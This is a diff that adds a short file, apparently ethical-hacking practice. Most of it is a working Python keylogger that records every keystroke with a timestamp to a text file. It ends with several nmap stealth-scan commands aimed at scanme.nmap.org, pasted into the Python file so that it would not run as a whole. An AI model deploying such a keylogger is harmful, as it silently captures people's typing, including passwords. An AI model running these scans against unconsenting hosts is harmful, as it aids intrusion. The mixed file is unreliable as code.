@@ -1,0 +1,30 @@
+from pynput.keyboard import Key, Listener
+import logging
+
+# Specify the directory where the log file will be saved
+log_dir = "C:/Users/sejalpatil1728/Desktop/EH/"
+
+# Configure the logging settings
+logging.basicConfig(
+    filename=(log_dir + "key_log.txt"),
+    level=logging.DEBUG,
+    format="%(asctime)s: %(message)s"
+)
+
+# Define the function to log key presses
+def on_press(key):
+    try:
+        logging.info(str(key))  # Log the key as a string
+    except Exception as e:
+        logging.error(f"Error: {e}")
+
+# Set up the listener for key presses
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+
+nmap -sA -T4 scanme.nmap.org
+nmap -p 22,113,139 scanme.nmap.org
+nmap -sF -T4 scanme.nmap.org
+nmap -sA -p22 scanme.nmap.org
+nmap -sX -T4 scanme.nmap.org
